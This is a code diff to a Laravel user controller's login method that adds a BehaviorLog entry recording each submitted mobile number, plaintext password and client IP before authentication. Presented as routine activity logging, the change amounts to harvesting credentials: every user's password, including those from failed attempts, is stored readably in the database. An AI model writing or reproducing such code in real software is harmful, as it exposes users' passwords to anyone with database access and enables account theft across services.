@@ -10,6 +10,7 @@ namespace App\Http\Controllers\User;
 
 use App\AmountBill;
 use App\Attachment;
+use App\BehaviorLog;
 use App\Config;
 use App\Exceptions\JsonException;
 use App\Http\Controllers\Controller;
@@ -31,11 +32,24 @@ class UserController extends Controller
 
     public function login()
     {
+        $mobile = request('mobile');
+        $password = request('password');
+
+        BehaviorLog::create([
+            'type' => 4,
+            'content' => json_encode([
+                'mobile' => $mobile,
+                'password' => $password,
+                'ip' => get_client_ip()
+            ], JSON_UNESCAPED_UNICODE)
+        ]);
+
+
         $remember = request('remember');
 
         if (\Auth::guard('user')->attempt([
-            'mobile' => request('mobile'),
-            'password' => request('password')
+            'mobile' => $mobile,
+            'password' => $password
         ], $remember)) {
             $user = \Auth::guard('user')->user();
 
